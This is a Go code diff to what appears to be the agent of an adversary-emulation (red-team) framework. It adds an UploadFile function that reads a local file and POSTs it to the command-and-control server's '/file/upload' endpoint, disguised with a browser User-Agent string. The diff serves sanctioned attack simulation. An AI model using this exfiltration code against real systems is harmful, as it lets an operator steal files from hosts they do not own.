@@ -5,10 +5,14 @@ import (
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"fmt"
+	"io"
 	"io/ioutil"
+	"mime/multipart"
 	"net/http"
 	"net/url"
+	"os"
 	"path/filepath"
 
 	"github.com/mitre/gocat/output"
@@ -118,6 +122,50 @@ func (a *API) SendExecutionResults(profile map[string]interface{}, result map[st
 
 func (a *API) GetName() string {
 	return a.name
+}
+
+func (a *API) UploadFile(profile map[string]interface{}, path string) error {
+	c2address, ok := profile["server"].(string)
+	userAgent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+	if !ok {
+		return errors.New("No server address provided in profile.")
+	}
+	uploadUrl := c2address + "/file/upload"
+	file, err := os.Open(path)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+	requestBody := &bytes.Buffer{}
+	writer := multipart.NewWriter(requestBody)
+	part, err := writer.CreateFormFile("file", filepath.Base(path))
+	if err != nil {
+		return err
+	}
+	if _, err = io.Copy(part, file); err != nil {
+		return err
+	}
+	if err = writer.Close(); err != nil {
+		return err
+	}
+	req, err := http.NewRequest("POST", uploadUrl, requestBody)
+	if err != nil {
+		return err
+	}
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	req.Header.Set("X-Request-Id", fmt.Sprintf("%s-%s", profile["host"].(string), profile["paw"].(string)))
+	req.Header.Set("User-Agent", userAgent)
+	resp, err := a.client.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode == http.StatusOK {
+		return nil
+	} else {
+		return errors.New(fmt.Sprintf("Non-successful HTTP response status code: %d", resp.StatusCode))
+	}
+	return nil
 }
 
 func (a *API) request(address string, data []byte) []byte {
